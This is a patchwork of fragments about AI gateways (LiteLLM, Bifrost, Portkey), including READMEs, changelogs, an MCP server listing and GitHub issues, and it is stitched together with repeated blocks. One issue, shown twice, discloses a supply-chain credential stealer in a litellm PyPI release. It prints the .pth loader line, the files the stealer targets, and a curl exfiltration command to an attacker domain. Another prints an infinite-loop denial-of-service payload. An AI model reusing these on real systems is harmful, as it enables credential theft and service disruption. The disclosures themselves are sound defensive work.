>           > **Trenutni status: fiksiran (pinned) Claude Code `2.1.258`; offline i live validacija posljednji put zabilježena na `2.1.220`.** Fiksiranje na `2.1.220` je završilo tri izolovana scenarija kroz Devin CLI `3000.2.17` i model `swe-1-7-lightning`; to posljednje live pokretanje je dokazalo `Read`, `Edit` i `Bash` poteze u vlasništvu klijenta, uspješne `npm test` rezultate, otkrivanje komandi projekta i vještina, rutiranje samo preko Devin-a, i nula Claude izlaznog saobraćaja (egress). Fiksiranje je zatim podignuto na `2.1.258` (CLI generacija koju imitira OmniRoute-ov Claude identitet, i prva linija koja nativno isporučuje Fable 5.1 nivo). Na novom fiksiranju, instalacioni sloj i `claude --version` su verifikovani na fiksiranoj baznoj slici, a bridge unit suite, `compose config` i statički dokaz izolacije prolaze — ali offline mock scenario i live suite od tri scenarija još nisu ponovo pokrenuti. Ponovo ih pokrenite (pogledajte "Updating pinned tools") prije oslanjanja na bridge sa ovim fiksiranjem.

Call any LLM in OpenAI format.</p>\n        <p align=\"center\">\n        <a href=\"https://render.com/deploy?repo=https://github.com/BerriAI/litellm\" target=\"_blank\" rel=\"nofollow\"><img src=\"https://render.com/images/deploy-to-render-button.svg\" alt=\"Deploy to Render\" height=\"40\"></a>\n        <a href=\"https://railway.com/deploy/RhvhdC?referralCode=7mRv9K&utm_medium=integration&utm_source=template&utm_campaign=generic\"><img src=\"https://railway.com/button.svg\" alt=\"Deploy on Railway\" height=\"40\"></a>\n        <a href=\"https://console.aws.amazon.com/cloudshell/home\" target=\"_blank\" rel=\"nofollow\"><img src=\"./.github/deploy-on-aws.png\" alt=\"Deploy on AWS\" height=\"40\"></a>\n        <a href=\"https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https%3A%2F%2Fgithub.com%2FBerriAI%2Flitellm&cloudshell_workspace=terraform%2Flitellm%2Fgcp%2Fexamples%2Fdefault&cloudshell_tutorial=TUTORIAL.md&cloudshell_image=gcr.io/ds-artifacts-cloudshell/deploystack_custom_image&shellonly=true\" target=\"_blank\" rel=\"nofollow\"><img src=\"./.github/deploy-on-gcp.png\" alt=\"Deploy on GCP\" height=\"40\"></a>\n\n... [28 lines omitted] ...\n\n\n---\n\n## What is LiteLLM\n\nLiteLLM is an open source AI Gateway that gives you a single, unified interface to call 100+ LLM providers — OpenAI, Anthropic, Gemini, Bedrock, Azure, and more — using the OpenAI format.\n\nUse it as a **Python SDK** for direct library integration, or deploy the **AI Gateway (Proxy Server)** as a centralized service for your team or organization.\n\n[**Jump to LiteLLM Proxy (LLM Gateway) Docs**](https://docs.litellm.ai/docs/simple_proxy) <br>\n[**Jump to Supported LLM Providers**](https://docs.litellm.ai/docs/providers)\n\n... [3 lines omitted] ...\n\n## Why LiteLLM\n\nManaging LLM calls across providers gets complicated fast — different SDKs, auth patterns, request formats, and error types for every model. LiteLLM removes that friction:\n\n- **Unified API** — one interface for 100+ LLMs, no provider-specific SDK juggling\n- **Drop-in OpenAI compatibility** — swap providers without rewriting your code\n- **Production-ready gateway** — virtual keys, spend tracking, guardrails, load balancing, and an admin dashboard out of the box\n- **8ms P95 latency** at 1k RPS ([benchmarks](https://docs.litellm.ai/docs/benchmarks))\n\n### OSS Adopters\n\n\n... >       content: |2-
>
>         ### Core Infrastructure
>
>         - **[Unified Interface](https://docs.getbifrost.ai/providers/supported-providers/overview)** - Single OpenAI-compatible API for all providers
>         - **[Multi-Provider Support](https://docs.getbifrost.ai/quickstart/gateway/provider-configuration)** - OpenAI, Anthropic, AWS Bedrock, Google Vertex, Azure, Cerebras, Cohere, Mistral, Ollama, Groq, and more
>         - **[Automatic Fallbacks](https://docs.getbifrost.ai/features/retries-and-fallbacks)** - Seamless failover between providers and models with zero downtime
>         - **[Load Balancing](https://docs.getbifrost.ai/features/retries-and-fallbacks)** - Intelligent request distribution across multiple API keys and providers
>
>         ### Advanced Features
>
>         - **[Model Context Protocol (MCP)](https://docs.getbifrost.ai/mcp/overview)** - Enable AI models to use external tools (filesystem, web search, databases)
>         - **[Semantic Caching](https://docs.getbifrost.ai/features/semantic-caching)** - Intelligent response caching based on semantic similarity to reduce costs and latency
>
>         ... [138 lines omitted] ...
>

>
>         - [Multi-Provider Support](https://docs.getbifrost.ai/providers/supported-providers/overview) - Single API for all providers
>         - [MCP Integration](https://docs.getbifrost.ai/mcp/overview) - External tool calling
>         - [Semantic Caching](https://docs.getbifrost.ai/features/semantic-caching) - Intelligent response caching
>         - [Fallbacks & Load Balancing](https://docs.getbifrost.ai/features/retries-and-fallbacks) - Reliability features
>         - [Budget Management](https://docs.getbifrost.ai/features/governance/budget-and-limits) - Cost control and governance
>
>         ### Integrations

>             "path": "README.md",
>             "content": "\n### Core Infrastructure\n\n- **[Unified Interface](https://docs.getbifrost.ai/providers/supported-providers/overview)** - Single OpenAI-compatible API for all providers\n- **[Multi-Provider Support](https://docs.getbifrost.ai/quickstart/gateway/provider-configuration)** - OpenAI, Anthropic, AWS Bedrock, Google Vertex, Azure, Cerebras, Cohere, Mistral, Ollama, Groq, and more\n- **[Automatic Fallbacks](https://docs.getbifrost.ai/features/retries-and-fallbacks)** - Seamless failover between providers and models with zero downtime\n- **[Load Balancing](https://docs.getbifrost.ai/features/retries-and-fallbacks)** - Intelligent request distribution across multiple API keys and providers\n\n### Advanced Features\n\n- **[Model Context Protocol (MCP)](https://docs.getbifrost.ai/mcp/overview)** - Enable AI models to use external tools (filesystem, web search, databases)\n- **[Semantic Caching](https://docs.getbifrost.ai/features/semantic-caching)** - Intelligent response caching based on semantic similarity to reduce costs and latency\n\n... [138 lines omitted] ...\n\n### Features\n\n- [Multi-Provider Support](https://docs.getbifrost.ai/providers/supported-providers/overview) - Single API for all providers\n- [MCP Integration](https://docs.getbifrost.ai/mcp/overview) - External tool calling\n- [Semantic Caching](https://docs.getbifrost.ai/features/semantic-caching) - Intelligent response caching\n- [Fallbacks & Load Balancing](https://docs.getbifrost.ai/features/retries-and-fallbacks) - Reliability features\n- [Budget Management](https://docs.getbifrost.ai/features/governance/budget-and-limits) - Cost control and governance\n\n### Integrations\n\n- [OpenAI SDK](https://docs.getbifrost.ai/integrations/openai-sdk/overview) - Drop-in OpenAI replacement",

>         # AI Gateway

>         ## Core Features
>         ### Reliable Routing
>         - <a href="https://portkey.wiki/gh-37">**Fallbacks**</a>: Fallback to another provider or model on failed requests using the LLM gateway. You can specify the errors on which to trigger the fallback. Improves reliability of your application.
>         - <a href="https://portkey.wiki/gh-38">**Automatic Retries**</a>: Automatically retry failed requests up to 5 times. An exponential backoff strategy spaces out retry attempts to prevent network overload.
>         - <a href="https://portkey.wiki/gh-39">**Load Balancing**</a>: Distribute LLM requests across multiple API keys or AI providers with weights to ensure high availability and optimal performance.
>         - <a href="https://portkey.wiki/gh-40">**Request Timeouts**</a>: Manage unruly LLMs & latencies by setting up granular request timeouts, allowing automatic termination of requests that exceed a specified duration.
>         - <a href="https://portkey.wiki/gh-41">**Multi-modal LLM Gateway**</a>: Call vision, audio (text-to-speech & speech-to-text), and image generation models from multiple providers  — all using the familiar OpenAI signature
>         - <a href="https://portkey.wiki/gh-42">**Realtime APIs**</a>: Call realtime APIs launched by OpenAI through the integrate websockets server.
>
>         ### Security & Accuracy
>         - <a href="https://portkey.wiki/gh-88">**Guardrails**</a>: Verify your LLM inputs and outputs to adhere to your specified checks. Choose from the 40+ pre-built guardrails to ensure compliance with security and accuracy standards. You can <a href="https://portkey.wiki/gh-43">bring your own guardrails</a> or choose from our <a href="https://portkey.wiki/gh-44">many partners</a>.
>         - [**Secure Key Management**](https://portkey.wiki/gh-45): Use your own keys or generate virtual keys on the fly.

A router that switched models mid-conversation returned "messages.N.content.0: Invalid `signature` in `thinking` block" to the client instead of retrying without the signature.

>                 "value": "- **Stop Sequences Dropped for Nova and Titan** - Bedrock's Converse camelCase `stopSequences` now maps to the neutral `stop` parameter alongside Anthropic's `stop_sequences`. 81 catalog rows were silently losing `stop`, so the provider ran to `end_turn` instead of stopping.\n- **Reasoning Replay Rejected on Chat-Shaped Requests** - `/v1/chat/completions` and `/v1/messages` carry replayed reasoning on `reasoning_details`, but the fail-soft strip only handled Responses-shaped items. A router that switched models mid-conversation returned \"messages.N.content.0: Invalid `signature` in `thinking` block\" to the client instead of retrying without the signature.\n- **Thinking Signatures on Responses Content Blocks** - Signatures are stripped off content blocks, not just `encrypted_content` on the reasoning item. A message could need the strip with `encrypted_content` already absent, and only reasoning items are dropped when nothing survives, so an ordinary message keeps its own content.",
>                 "matchIndices": [

>               {
>                 "value": "<Update label=\"Core\" description=\"1.7.10\">\n- fix: retry after an unverifiable reasoning refusal on chat-shaped requests too - `/v1/chat/completions` and `/v1/messages` carry replayed reasoning on `reasoning_details`, but the fail-soft strip only handled Responses-shaped items, so a router that switched models mid-conversation returned \"messages.N.content.0: Invalid `signature` in `thinking` block\" straight to the client instead of retrying without the signature\n- fix: strip thinking signatures off Responses content blocks, not just `encrypted_content` on the reasoning item - a message could need the strip with `encrypted_content` already absent, and only reasoning items are dropped when nothing survives so an ordinary message keeps its own content",

>         * fix(otel): send cache and reasoning tokens in langfuse usage_details
>
>         The OTel V2 Langfuse mapper only sent input, output and total, so cache reads, cache writes and reasoning tokens never reached Langfuse. Emit them as input_cached_tokens, input_cache_creation and output_reasoning_tokens, and send input/output net of those buckets so Langfuse does not price the same tokens twice.

>         fix(ui): skip format validation for API-masked secret values in Copilot provider form (#6840)
>         ## Summary
>
>         When editing a stored GitHub Copilot provider configuration, the API returns masked credential values (e.g., `******` or `1234****...****5678`) for fields the operator did not retype. The form round-trips these masks back to the server, which preserves the original values. Previously, the format validators (`isLiteralDigits` and `isLiteralPEM`) would reject these masked values, causing validation to fail on every edit where not all credentials were retyped.

>         feat(core): enforce TTFT deadline per stream attempt with fallback handover (#7504)
>         ## Summary
>
>         Adds a per-attempt Time-To-First-Token (TTFT) deadline for streaming requests. When a provider opens a stream but produces only startup events (or never sends response headers) within the configured deadline, Bifrost cuts off that attempt and immediately tries the next fallback. The last attempt in the chain is never cut off, ensuring every request eventually gets an answer.

>         feat(core): per-attempt first-token (TTFT) abort for stream attempts (#7503)
>         ## Summary
>
>         Introduces a per-attempt first-token deadline (TTFT timeout) for streaming requests. When a stream attempt produces no output before its deadline, the attempt's socket is closed and `ErrStreamFirstTokenTimeout` is returned, without cancelling the shared request context. This allows fallbacks and retries to proceed normally rather than being blocked by a `RequestCancelled` error.

>    📦 Official | 🔍 Glama
>
> 3. **io.github.paipaipai666/nexus-browser-mcp** (v0.3.0)
>    A browser-automation MCP server built on Playwright that provides deterministic snapshots via MutationObserver/requestAnimationFrame, HITL governance, multi-task isolation, and self-healing browser sessions for LLM-driven browsing.
>    Package: nexus-browser-mcp | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama
>
> 4. **io.github.ooples/mcp-console-automation** (v1.0.2)
>    Enables AI assistants to fully interact with console applications, monitor output, detect errors, and automate terminal workflows across multiple sessions. Similar to how Playwright works for web browsers but for command-line interfaces.
>    Package: mcp-console-automation | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama
>
> 5. **io.github.swimmwatch/cloakbrowser-mcp** (v1.14.1)

>    Package: cloakbrowser-mcp | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama
>
> 6. **io.github.markswendsen-code/ubereats** (v0.1.0)

>    Package: @striderlabs/mcp-ubereats | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama
>
> 7. **io.github.kitewright/mcp** (v0.1.1)
>    A lightweight MCP server for browser automation that gives AI agents navigate, screenshot, and extract tools via a single small binary, without needing Node.js or Playwright. It provides CDP-based browser control with efficient startup and resource usage.
>    Package: @kitewright/mcp | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama
>
> 8. **io.github.noncelogic/mcp** (v1.9.1)
>    Hosted Playwright browser automation for AI agents. Returns accessibility trees instead of screenshots, cutting token usage by 77%. Navigate, interact, extract structured data, and take screenshots — all via MCP. Zero infrastructure, credit-based pricing.
>    Package: @roveapi/mcp | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama
>

>    Package: @striderlabs/mcp-delta | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama
>

Built-in accessibility tree snapshots for AI agents (500x fewer tokens than screenshot-based approaches). Works with any Chromium browser already installed. 50KB total, no Playwright or Puppeteer needed.
>    Package: cdpilot | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama

>    Package: browsegrab | Transport: stdio | 🌐 Remote available
>    📦 Official | 🔍 Glama

It can be installed alongside Claude Code, Cursor, Windsurf, Zed, Hermes, and other MCP clients, with vault and memory optionally run entirely on the user's machine.

>    OrgX is coordination infrastructure for AI-native teams. It gives your LLM a persistent organizational layer: initiatives with milestones and tasks, human-in-the-loop decision workflows, specialist agent delegation, and cross-session memory that survives tool switching.
> What you can do with OrgX via MCP:
>
> Scaffold initiatives — decompose a goal into workstreams, milestones, and tasks in one call
> Manage decisions — create, review, approve, or reject decisions with audit trails
> Delegate to specialist agents — spawn tasks for domain agents (engineering, marketing, product, sales, operations, design) and monitor their progress
> Query organizational memory — search past decisions, artifacts, and learnings across initiatives
> Track progress — get initiative health, agent status, blockers, and morning briefs
> Plan and prioritize — score queues, get next-action recommendations, and run autonomous sessions with budget guardrails
>
> OrgX is built for solo founders and small teams who work across multiple AI tools and lose context between sessions. Instead of manually shuttling context between Claude, Cursor, and ChatGPT, OrgX holds the organizational graph so every tool sees the same state.

> I checked the skill ecosystem without installing the `skills` CLI: the installed `find-skills` workflow’s CLI is absent, and invoking `npx` would fetch a package, which your research-only constraints prohibit. The Skills directory itself is reachable read-only, so I’m querying its public search surface directly and will label it as a web fallback, not claim the CLI was used.

> The strongest pattern is now clear from source evidence: LiteLLM and Bifrost cover much of Level 2, while OpenHands and Mastra cover much of Level 3; LangGraph and Temporal are durable orchestration components rather than gateways. None proves the complete combined architecture, especially Shofni’s cross-protocol tool emulation/repair plus owned workspace runtime, so the recommendation will likely be composition with a thin Shofni core and a focused POC.

llm_router.is_recognized_model(model):\n        return True\n    if model in llm_router.team_public_model_names:\n        return True\n    return bool(llm_router.pattern_router.get_pattern(model))\n\ndef _resolve_cursor_model_variant(\n    data: dict, llm_router: \"Router | None\"\n) -> dict:\n    model: Final = data.get(\"model\")\n    if not isinstance(model, str) or _router_can_serve(model, llm_router):\n        return data\n    variant: Final = _parse_cursor_model_variant(model)\n    if variant.base_model == model or not >       body: |
>         [LITELLM TEAM] - For updates from the team, please see: https://github.com/BerriAI/litellm/issues/24518
>         ---
>         # [Security]: CRITICAL: Malicious `litellm_init.pth` in litellm 1.82.8 PyPI package — credential stealer
>
>         ## Summary
>
>         The `litellm==1.82.8` wheel package on PyPI contains a malicious `.pth` file (`litellm_init.pth`, 34,628 bytes) that **automatically executes a credential-stealing script every time the Python interpreter starts** — no `import litellm` required.
>
>         This is a supply chain compromise. The malicious file is listed in the package's own `RECORD`:
>
>         ```
>         litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628
>         ```
>
>         ## Reproduction
>
>         ```bash
>         pip download litellm==1.82.8 --no-deps -d /tmp/check
>         python3 -c "
>         import zipfile, os
>         whl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0]
>         with zipfile.ZipFile(whl) as z:
>             pth = [n for n in z.namelist() if n.endswith('.pth')]
>             print('PTH files:', pth)
>             for p in pth:
>                 print(z.read(p)[:300])
>         "
>         ```
>
>         You will see `litellm_init.pth` containing:
>
>         ```python
>         import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('...'))"])
>         ```
>
>         ## Malicious Behavior (full analysis)
>
>         The payload is **double base64-encoded**. When decoded, it performs the following:
>
>         ### Stage 1: Information Collection
>
>         The script collects sensitive data from the host system:
>
>         - **System info**: `hostname`, `whoami`, `uname -a`, `ip addr`, `ip route`
>         - **Environment variables**: `printenv` (captures all API keys, secrets, tokens)
>         - **SSH keys**: `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`, `~/.ssh/id_dsa`, `~/.ssh/authorized_keys`, `~/.ssh/known_hosts`, `~/.ssh/config`
>         - **Git credentials**: `~/.gitconfig`, `~/.git-credentials`
>         - **AWS credentials**: `~/.aws/credentials`, `~/.aws/config`, IMDS token + security credentials
>         - **Kubernetes secrets**: `~/.kube/config`, `/etc/kubernetes/admin.conf`, `/etc/kubernetes/kubelet.conf`, `/etc/kubernetes/controller-manager.conf`, `/etc/kubernetes/scheduler.conf`, service account tokens
>         - **GCP credentials**: `~/.config/gcloud/application_default_credentials.json`
>         - **Azure credentials**: `~/.azure/`
>         - **Docker configs**: `~/.docker/config.json`, `/kaniko/.docker/config.json`, `/root/.docker/config.json`
>         - **Package manager configs**: `~/.npmrc`, `~/.vault-token`, `~/.netrc`, `~/.lftprc`, `~/.msmtprc`, `~/.my.cnf`, `~/.pgpass`, `~/.mongorc.js`
>         - **Shell history**: `~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.mysql_history`, `~/.psql_history`, `~/.rediscli_history`
>         - **Crypto wallets**: `~/.bitcoin/`, `~/.litecoin/`, `~/.dogecoin/`, `~/.zcash/`, `~/.dashcore/`, `~/.ripple/`, `~/.bitmonero/`, `~/.ethereum/keystore/`, `~/.cardano/`, `~/.config/solana/`
>         - **SSL/TLS private keys**: `/etc/ssl/private/`, Let's Encrypt `.pem` and `.key` files
>         - **CI/CD secrets**: `terraform.tfvars`, `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `.drone.yml`, `Anchor.toml`, `ansible.cfg`
>         - **Database credentials**: PostgreSQL, MySQL, Redis, LDAP config files
>         - **Webhook URLs**: grep for Slack/Discord webhook URLs in env and config files
>
>         ### Stage 2: Encryption & Exfiltration
>
>         1. Collected data is written to a temporary file
>         2. A random 32-byte AES-256 session key is generated via `openssl rand`
>         3. The collected data is encrypted with `openssl enc -aes-256-cbc -pbkdf2`
>         4. The AES session key is encrypted with a **hardcoded 4096-bit RSA public key** via `openssl pkeyutl -encrypt -pkeyopt rsa_padding_mode:oaep`
>         5. Both encrypted files are packed into `tpcp.tar.gz`
>         6. The archive is exfiltrated via:
>
>         ```bash
>         curl -s -o /dev/null -X POST \
>           "https://models.litellm.cloud/" \
>           -H "Content-Type: application/octet-stream" \
>           -H "X-Filename: tpcp.tar.gz" \
>           --data-binary @tpcp.tar.gz
>         ```
>
>         ## Key Technical Details
>
>         - **Trigger mechanism**: `.pth` files in `site-packages/` are executed automatically by the Python interpreter on startup (see [Python docs on .pth files](https://docs.python.org/3/library/site.html)). No `import` statement is needed.
>         - **Stealth**: The payload is double base64-encoded, making it invisible to naive source code grep.
>         - **Exfiltration target**: `https://models.litellm.cloud/` — note the domain `litellm.cloud` (NOT `litellm.ai`, the official domain).
>         - **RSA public key** (first 64 chars): `MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+...`
>
>         ## Impact
>
>         Anyone who installed `litellm==1.82.8` via pip has had **all environment variables, SSH keys, cloud credentials, and other secrets** collected and sent to an attacker-controlled server.
>
>         This affects:
>         - Local development machines
>         - CI/CD pipelines
>         - Docker containers
>         - Production servers
>
>         ## Affected Version
>
>         - **Confirmed**: `litellm==1.82.8` (PyPI wheel `litellm-1.82.8-py3-none-any.whl`)
>         - **Other versions**: Not yet checked — the attacker may have compromised multiple releases
>
>         ## Recommended Actions
>
>         1. **PyPI**: Yank/remove litellm 1.82.8 immediately
>         2. **Users**: Check for `litellm_init.pth` in your `site-packages/` directory
>         3. **Users**: Rotate ALL credentials that were present as environment variables or in config files on any system where litellm 1.82.8 was installed
>         4. **BerriAI**: Audit PyPI publishing credentials and CI/CD pipeline for compromise
>
>         ## Environment
>
>         - OS: Ubuntu 24.04 (Docker container)
>         - Python: 3.13
>         - pip installed from PyPI
>         - Discovered: 2026-03-24

>         user: IgorGanapolsky
>         body: |-
>           Agentic systems are turning into always-on factories: one request fans out into model calls, tool calls, policy checks, and storage.
>
>           The hard part is rarely tokens/sec — it is control-plane reliability:
>           1. **Fan-out control** — hard cap on tools/steps per request before external writes
>           2. **Durable id + idempotency** — one write per business object (ledger / preflight)
>           3. **Observable long jobs** — progress + cooperative cancel on multi-minute runs
>           4. **Expected vs actual** — durable artifact id before marking success
>           5. **Policy before action** — gate that can refuse known-bad side effects
>
>           If you share one sanitized failing run (expected vs actual + tool result), I can map which pillar is broken. Architecture only.

>       body: |
>         Variant analysis following GHSA-wxxx-gvqv-xp7p (custom-code sandbox escape, fixed in 1.83.11) and GHSA-xqmj-j6mv-4862 (SSTI in `/prompts/test`, fixed in 1.83.7). Public source code review at HEAD; no proof-of-concept, no testing against any deployed instance.
>
>         Filing as a regular issue rather than a security advisory because both findings below are admin-gated (so they're DoS-by-admin, not external attacker reachable) and the third item is a design note rather than a bug. If you'd prefer any of them be tracked privately, let me know and I'll re-route.
>
>         ---
>
>         ## Finding 1 — Module-level `exec()` in `POST /guardrails/test_custom_code` runs without timeout protection (Low-Medium, DoS-by-admin)
>
>         **File:** `litellm/proxy/guardrails/guardrail_endpoints.py`, around line 2097
>
>         The endpoint correctly requires `PROXY_ADMIN` (line 2084) and correctly applies a 5-second `concurrent.futures.ThreadPoolExecutor` timeout to the `apply_guardrail` *function call* (lines 2149-2158). However, the **module-level `exec()` at line 2097 runs in the FastAPI handler thread with no timeout**:
>
>         ```python
>         EXECUTION_TIMEOUT_SECONDS = 5
>
>         try:
>             exec_globals = build_sandbox_globals()
>
>             try:
>                 compiled = compile_sandboxed(request.custom_code)
>                 exec(compiled, exec_globals)  # noqa: S102   <-- no timeout protection
>             except SyntaxError as e:
>                 ...
>             ...
>
>             # Step 4: Execute the function with timeout protection
>             def execute_guardrail():
>                 return apply_fn(test_inputs, safe_request_data, request.input_type)
>
>             try:
>                 with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
>                     future = executor.submit(execute_guardrail)
>                     try:
>                         result = future.result(timeout=EXECUTION_TIMEOUT_SECONDS)
>         ```
>
>         RestrictedPython blocks imports, exec, eval, compile, dunder access, and class definitions, so a malicious admin can't escalate to RCE through this path. But RestrictedPython does **not** prevent infinite loops in otherwise-valid Python. A trivial payload like:
>
>         ```python
>         while True:
>             pass
>
>         def apply_guardrail(inputs, request_data, input_type):
>             return allow()
>         ```
> ````

>             "body": "[LITELLM TEAM] - For updates from the team, please see: https://github.com/BerriAI/litellm/issues/24518\n---\n# [Security]: CRITICAL: Malicious `litellm_init.pth` in litellm 1.82.8 PyPI package — credential stealer\n\n## Summary\n\nThe `litellm==1.82.8` wheel package on PyPI contains a malicious `.pth` file (`litellm_init.pth`, 34,628 bytes) that **automatically executes a credential-stealing script every time the Python interpreter starts** — no `import litellm` required.\n\nThis is a supply chain compromise. The malicious file is listed in the package's own `RECORD`:\n\n```\nlitellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628\n```\n\n## Reproduction\n\n```bash\npip download litellm==1.82.8 --no-deps -d /tmp/check\npython3 -c \"\nimport zipfile, os\nwhl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0]\nwith zipfile.ZipFile(whl) as z:\n    pth = [n for n in z.namelist() if n.endswith('.pth')]\n    print('PTH files:', pth)\n    for p in pth:\n        print(z.read(p)[:300])\n\"\n```\n\nYou will see `litellm_init.pth` containing:\n\n```python\nimport os, subprocess, sys; subprocess.Popen([sys.executable, \"-c\", \"import base64; exec(base64.b64decode('...'))\"])\n```\n\n## Malicious Behavior (full analysis)\n\nThe payload is **double base64-encoded**. When decoded, it performs the following:\n\n### Stage 1: Information Collection\n\nThe script collects sensitive data from the host system:\n\n- **System info**: `hostname`, `whoami`, `uname -a`, `ip addr`, `ip route`\n- **Environment variables**: `printenv` (captures all API keys, secrets, tokens)\n- **SSH keys**: `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`, `~/.ssh/id_dsa`, `~/.ssh/authorized_keys`, `~/.ssh/known_hosts`, `~/.ssh/config`\n- **Git credentials**: `~/.gitconfig`, `~/.git-credentials`\n- **AWS credentials**: `~/.aws/credentials`, `~/.aws/config`, IMDS token + security credentials\n- **Kubernetes secrets**: `~/.kube/config`, `/etc/kubernetes/admin.conf`, `/etc/kubernetes/kubelet.conf`, `/etc/kubernetes/controller-manager.conf`, `/etc/kubernetes/scheduler.conf`, service account tokens\n- **GCP credentials**: `~/.config/gcloud/application_default_credentials.json`\n- **Azure credentials**: `~/.azure/`\n- **Docker configs**: `~/.docker/config.json`, `/kaniko/.docker/config.json`, `/root/.docker/config.json`\n- **Package manager configs**: `~/.npmrc`, `~/.vault-token`, `~/.netrc`, `~/.lftprc`, `~/.msmtprc`, `~/.my.cnf`, `~/.pgpass`, `~/.mongorc.js`\n- **Shell history**: `~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.mysql_history`, `~/.psql_history`, `~/.rediscli_history`\n- **Crypto wallets**: `~/.bitcoin/`, `~/.litecoin/`, `~/.dogecoin/`, `~/.zcash/`, `~/.dashcore/`, `~/.ripple/`, `~/.bitmonero/`, `~/.ethereum/keystore/`, `~/.cardano/`, `~/.config/solana/`\n- **SSL/TLS private keys**: `/etc/ssl/private/`, Let's Encrypt `.pem` and `.key` files\n- **CI/CD secrets**: `terraform.tfvars`, `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `.drone.yml`, `Anchor.toml`, `ansible.cfg`\n- **Database credentials**: PostgreSQL, MySQL, Redis, LDAP config files\n- **Webhook URLs**: grep for Slack/Discord webhook URLs in env and config files\n\n### Stage 2: Encryption & Exfiltration\n\n1. Collected data is written to a temporary file\n2. A random 32-byte AES-256 session key is generated via `openssl rand`\n3. The collected data is encrypted with `openssl enc -aes-256-cbc -pbkdf2`\n4. The AES session key is encrypted with a **hardcoded 4096-bit RSA public key** via `openssl pkeyutl -encrypt -pkeyopt rsa_padding_mode:oaep`\n5. Both encrypted files are packed into `tpcp.tar.gz`\n6. The archive is exfiltrated via:\n\n```bash\ncurl -s -o /dev/null -X POST \\\n  \"https://models.litellm.cloud/\" \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -H \"X-Filename: tpcp.tar.gz\" \\\n  --data-binary @tpcp.tar.gz\n```\n\n## Key Technical Details\n\n- **Trigger mechanism**: `.pth` files in `site-packages/` are executed automatically by the Python interpreter on startup (see [Python docs on .pth files](https://docs.python.org/3/library/site.html)). No `import` statement is needed.\n- **Stealth**: The payload is double base64-encoded, making it invisible to naive source code grep.\n- **Exfiltration target**: `https://models.litellm.cloud/` — note the domain `litellm.cloud` (NOT `litellm.ai`, the official domain).\n- **RSA public key** (first 64 chars): `MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+...`\n\n## Impact\n\nAnyone who installed `litellm==1.82.8` via pip has had **all environment variables, SSH keys, cloud credentials, and other secrets** collected and sent to an attacker-controlled server.\n\nThis affects:\n- Local development machines\n- CI/CD pipelines\n- Docker containers\n- Production servers\n\n## Affected Version\n\n- **Confirmed**: `litellm==1.82.8` (PyPI wheel `litellm-1.82.8-py3-none-any.whl`)\n- **Other versions**: Not yet checked — the attacker may have compromised multiple releases\n\n## Recommended Actions\n\n1. **PyPI**: Yank/remove litellm 1.82.8 immediately\n2. **Users**: Check for `litellm_init.pth` in your `site-packages/` directory\n3. **Users**: Rotate ALL credentials that were present as environment variables or in config files on any system where litellm 1.82.8 was installed\n4. **BerriAI**: Audit PyPI publishing credentials and CI/CD pipeline for compromise\n\n## Environment\n\n- OS: Ubuntu 24.04 (Docker container)\n- Python: 3.13\n- pip installed from PyPI\n- Discovered: 2026-03-24\n",

>             "body": "### Check for existing issues\n\n- [x] I have searched the existing issues and checked that my issue is not a duplicate.\n\n### What happened?\n\nWe got CVEs on `python-dotenv` but we are unable to fix this as litellm pins the python-dotenv to 1.0.1. Can you please either bump up the version or do not pin the versions in `pyproject.toml` instead use uv.lock or requirements.txt as mentioned in number of other issues in the board. Thank you.\n\n```\nVulnerability scan summary\n\tVulnerability found: GHSA-mf9w-mj56-hr94 - CLAIR-PYPI-PYTHON-DOTENV-2681296207\n\t\tURL: https://nvd.nist.gov/vuln/detail/CVE-2026-28684\n\t\tPackage: python-dotenv\n\t\tVersion: 1.0.1\n\t\tIntroduced By: pydantic-settings:2.14.0 --> python-dotenv:1.0.1, litellm:1.83.7 --> python-dotenv:1.0.1\n\t\tSeverity: medium\n\t\tDescription: python-dotenv: Symlink following in set_key allows arbitrary file overwrite via cross-device rename fallback\n\t\tRemediation: 1.2.2\n\t\tUpdated at: 2026-04-21T14:38:57Z\n\t\tCodes: [CVE-2026-28684]\n```\n\n### Steps to Reproduce\n\nThis is a security issue. No steps required to reproduce.\n\n\n\n### Relevant log output\n\n```shell\nVulnerability scan summary\n\tVulnerability found: GHSA-mf9w-mj56-hr94 - CLAIR-PYPI-PYTHON-DOTENV-2681296207\n\t\tURL: https://nvd.nist.gov/vuln/detail/CVE-2026-28684\n\t\tPackage: python-dotenv\n\t\tVersion: 1.0.1\n\t\tIntroduced By: pydantic-settings:2.14.0 --> python-dotenv:1.0.1, litellm:1.83.7 --> python-dotenv:1.0.1\n\t\tSeverity: medium\n\t\tDescription: python-dotenv: Symlink following in set_key allows arbitrary file overwrite via cross-device rename fallback\n\t\tRemediation: 1.2.2\n\t\tUpdated at: 2026-04-21T14:38:57Z\n\t\tCodes: [CVE-2026-28684]\n```\n\n### What part of LiteLLM is this about?\n\nSDK (litellm Python package)\n\n### What 